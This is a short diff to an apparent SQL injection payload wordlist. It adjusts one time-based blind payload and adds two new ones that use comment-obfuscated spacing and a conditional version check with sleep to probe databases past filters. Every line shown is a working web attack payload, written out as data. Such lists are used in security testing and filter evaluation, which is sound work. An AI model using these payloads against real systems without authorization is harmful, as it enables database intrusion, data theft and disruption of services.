@@ -1009,7 +1009,7 @@ WAITFOR DELAY '0:0:10' and 'a'='a;--
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z
 'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
-'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z
+'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
 'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(9) ELSE 0 END)XOR'Z
 /**/xor/**/sleep(10)
 //xor//sleep(10)
@@ -1020,3 +1020,5 @@ X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X
 X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X
 X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X
 zerodiumsleep(10);
+')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/10/**/#
+1-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(10),0)
